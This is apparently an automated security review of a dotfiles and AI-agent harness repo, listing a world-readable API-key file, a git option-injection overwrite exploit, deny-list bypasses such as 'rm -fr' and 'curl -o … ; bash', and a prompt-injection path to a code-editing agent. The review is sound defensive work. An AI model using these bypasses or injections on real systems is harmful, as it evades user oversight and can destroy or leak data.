## Security Review — 2026-08-20 (scope: paths)

**Summary:** Reviewed `bin/review-external.sh`, `bin/spec-backlog-apply.sh`,
`tests/test-codereview-marker.sh`, and `zat.env-install.sh` in full at HEAD 9c5ed5b
(clean tree). 0 BLOCK / 3 WARN / 1 NOTE. Two findings are concrete and verified: the
installer creates the external-reviewer credential file at the process umask (observed
0644 in a 0755 directory) with no chmod anywhere in the script, and `review-external.sh`
passes the `--range` value into `git log` without rejecting a leading dash, which yields
an arbitrary-file-overwrite primitive (reproduced end to end). The third concerns the
permission block the installer writes: under `defaultMode: auto` the allow list grants
several arbitrary-execution paths, and the prefix-matched deny list does not constrain
them. `bin/spec-backlog-apply.sh` and `tests/test-codereview-marker.sh` produced no
findings: the apply script parses its stdin manifest with pure parameter expansion, has
no `eval`/`source`, passes captured strings to awk via `-v` string assignment (not code),
uses literal `printf` format strings, and stages every mutation through `mktemp` + `mv`;
the marker test confines itself to `mktemp -d` scratch repos with trapped cleanup and
removes the two real cache-dir markers it touches. No hardcoded secrets and no PII in
any of the four files or in their last three history commits; `.env` is ignored both
repo-locally and globally, so no credential has ever entered git.

### Findings

```
[WARN] zat.env-install.sh:98-122 — external-reviewer credential file is created world-readable
  Attack vector: any other local account, or any process not running as the owner
    (backup/sync agents, a compromised unprivileged service), reads
    ~/.config/claude-reviewers/.env once the user fills in OPENAI_API_KEY or
    GEMINI_API_KEY. No interaction with the harness is required, only a read.
  Evidence: line 100 `mkdir -p "${REVIEWER_ENV_DIR}"` and line 103
    `cat > "${REVIEWER_ENV}"` run at the process umask; the script contains no
    chmod and no umask call. Observed on this host with umask 022: directory 0755,
    file 0644. The heredoc at 107-121 documents this exact file as the home for both
    API keys. By contrast bin/codereview-marker:75-76 chmods its cache directory to
    700 for a non-secret marker, so the credential file is currently less protected
    than the push marker. Prior reviews cleared this file on the grounds that the
    template holds placeholders only; the gap is the mode the user's real keys inherit.
  Remediation: `chmod 700 "${REVIEWER_ENV_DIR}"` after the mkdir and
    `chmod 600 "${REVIEWER_ENV}"` unconditionally after the create/append branches,
    so a re-run also repairs an existing 0644 file.

[WARN] bin/review-external.sh:63,76 -> 172 — --range value reaches `git log` unvalidated (option injection)
  Attack vector: any caller that forwards a string it did not itself constrain.
    `/codereview external <arg>` maps user text to a range (codereview SKILL.md
    Step E.2) and Step E.4 passes it through to this flag. A value beginning with `-`
    is parsed by git as an option rather than a revision, and `--output=<path>` makes
    `git log` truncate and rewrite any user-writable file. Reproduced: with one
    provider configured and a non-empty diff on stdin,
    `review-external.sh "--range=--output=$VICTIM"` replaced the victim file's
    contents with `git log --oneline` output. Because commit subjects are
    attacker-influenced in any repo that accepts outside commits, part of the written
    content is chosen by the attacker, which extends the primitive from destructive
    clobber toward execution when the target is a shell rc file.
  Evidence: line 63 `RANGE="$2"` and line 76 `RANGE="${1#--range=}"` reject only the
    empty string; the sink is line 172
    `COMMIT_SUMMARY=$(git log --oneline "${RANGE}" 2>/dev/null || true)`.
    The only existing validation is prose in the skill (Step E.2, "Validate every
    named ref with git rev-parse"), which is LLM-executed and therefore not an
    enforcement boundary, and the script is directly invocable from ~/bin. CLAUDE.md's
    own deterministic-versus-instructed split argues for the check living in the script.
  Remediation: reject a leading dash at parse time, e.g.
    `[[ "${RANGE}" == -* ]] && { echo "review-external.sh: --range must not begin with '-'" >&2; exit 2; }`
    applied to both the `--range <v>` and `--range=<v>` branches.

[WARN] zat.env-install.sh:160-197 — deny list does not constrain what the allow list grants
  Attack vector: prompt injection in any content the agent reads (a diff from a remote
    branch, a dependency file, fetched web content, external reviewer output) that
    induces a single Bash call. `Bash(python3 *)` (line 166) auto-approves
    `python3 -c '<arbitrary code>'`; `Bash(node *)` (169), `Bash(pip *)` (167),
    `Bash(make *)` (183), and `Bash(git *)` (164, via `git -c alias.x='!sh -c ...' x`)
    are equivalent. No prompt is shown because `defaultMode` is `auto` (line 162).
  Evidence: the deny list (191-195) is prefix-matched, so `Bash(rm -rf *)` does not
    cover `rm -fr`, `rm -r -f`, or `find . -delete`, and `Bash(curl * | bash *)` does
    not cover `curl -o /tmp/x <url>; bash /tmp/x`. README.md:161 describes the block as
    a "deny list for dangerous patterns", which overstates what it enforces. Auto mode
    is a deliberate design choice for this harness and is not itself the finding; the
    finding is that the deny entries read as a containment boundary while providing
    none. Related: the block replaces `.permissions` wholesale on every run (comment at
    158-159), so any deny rule a user added by hand is silently dropped on re-install.
  Remediation: either narrow the execution-granting allow entries to specific
    subcommands (`Bash(python3 -m venv *)`, `Bash(npm run *)`, and similar) or drop the
    deny list and state plainly in README.md that the harness runs unsandboxed, so the
    documentation matches the enforcement.

[NOTE] bin/review-external.sh:307-313, 401-407, 462-468, 502-511 — third-party model output reaches a code-modifying agent
  Attack vector: reviewing code the operator did not author (a contributor branch, a
    vendored dependency bump) whose content steers an external reviewer into emitting a
    finding line that reads as an actionable instruction. Verified path: Step 5.5
    captures this script's stdout into EXTERNAL_FINDINGS, Step 6/6.5 writes it into
    CODEREVIEW.md with provider tags preserved, and Step 7 forks /codefix, which reads
    CODEREVIEW.md "as a spec and applies minimal fixes without self-evaluation" and
    holds Edit.
  Evidence: the per-provider loops and the final demux at 502-511 filter on
    `^\[(BLOCK|WARN|NOTE)\]`, which constrains the shape of a line but not the free
    text after the tag. Informational only: the chain needs attacker-authored code under
    review, configured external providers, a compliant external model, and a re-review
    (Step 7) that misses the change.
  Remediation: none required. If tightening is wanted, cap forwarded finding lines at a
    fixed length and mark provider-tagged findings as advisory-only in CODEREVIEW.md so
    /codefix treats them as read-only context rather than as a spec.
```

### Accepted Risks

- **PII in source files** (hw-bootstrap.sh, LICENSE, NOTICE, README.md, and other references to `peterzat`): Inherent to a personal dotfiles repo. Reviewed and accepted. None of the four files in this review's scope contains PII.
- **Vendor `curl | bash` installers** (hw-bootstrap.sh: NodeSource line 85, Tailscale line 200, Claude Code line 208): Remote code execution by design over HTTPS to first-party vendor domains; the documented purpose of a bootstrap script. Not checksum-pinned, consistent with the accepted-risk philosophy for first-party supply-chain trust on this box.
- **Predictable `/tmp/cuda-keyring.deb` path** (hw-bootstrap.sh:183-188): `curl -o /tmp/cuda-keyring.deb` then `sudo dpkg -i` of a predictable path. TOCTOU vector only on a multi-user host; immaterial on the documented single-user target.
- **Pre-push gate detection is heuristic, not a shell parser** (hooks/pre-push-codereview.sh): `is_git_push` misses wrapper/prefix invocations (`env`, `command`, `bash -c`, `eval`, absolute-path, `xargs`, env-var prefix); `is_tag_only_push` treats a branch named `v[0-9]...` as a tag. Both let a push bypass the advisory codereview gate. Accepted under the advisory-gate threat model; the hook is intentionally simple, biased toward over-detection.
- **Diff content forwarded to third-party APIs** (`bin/review-external.sh`): The full git diff is sent to OpenAI and Google when configured. Secrets in the diff would be exposed. This is the script's explicit purpose; the user opts in by configuring API keys.
- **API key in `curl -H` header argument** (`bin/review-external.sh:263, 354`): The header argument is visible in `/proc/<pid>/cmdline` to any local user during the curl invocation window. Not exploitable on this single-user dev box. Line references refreshed from the prior 246/337. Note that the first WARN above is a distinct and persistent form of the same exposure (a file readable at rest rather than a process argument readable during one call) and is not covered by this acceptance.

---
*Prior review (2026-08-03, scope: paths): Reviewed `tests/lint-skills.sh` in full at 2646eff. 0 BLOCK / 0 WARN / 0 NOTE. The script is a read-only structural lint that derives REPO_DIR from its own location, takes no arguments, greps repo-internal files against hardcoded patterns, and writes nothing, so it has no injection, symlink, or TOCTOU sink; several of its checks are themselves security regression guards, making the file net security-positive.*

<!-- SECURITY_META: {"date":"2026-08-20","commit":"9c5ed5b8f62da959b464407534b12393d9cc4352","scope":"paths","scanned_files":["bin/review-external.sh","bin/spec-backlog-apply.sh","tests/test-codereview-marker.sh","zat.env-install.sh"],"block":0,"warn":3,"note":1} -->
